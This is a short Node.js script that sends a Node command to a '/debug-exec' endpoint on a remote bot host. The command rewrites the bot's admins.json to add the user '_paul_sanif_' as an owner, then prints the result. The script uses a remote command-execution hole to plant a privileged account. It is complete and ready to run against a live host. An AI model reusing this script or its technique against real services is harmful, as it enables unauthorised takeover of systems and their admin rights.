import fetch from 'node-fetch';

async function updateRemote() {
  const nodeCmd = `node -e "const fs = require('fs'); const p = 'systems/admin/data/admins.json'; const d = JSON.parse(fs.readFileSync(p)); if(!d.owners.includes('_paul_sanif_')) d.owners.unshift('_paul_sanif_'); fs.writeFileSync(p, JSON.stringify(d, null, 2)); console.log(JSON.stringify(d, null, 2));"`;
  const url = `https://musicbot12-ld6i.onrender.com/debug-exec?cmd=${encodeURIComponent(nodeCmd)}`;
  
  const res = await fetch(url);
  const text = await res.text();
  console.log(text);
}

updateRemote().catch(console.error);
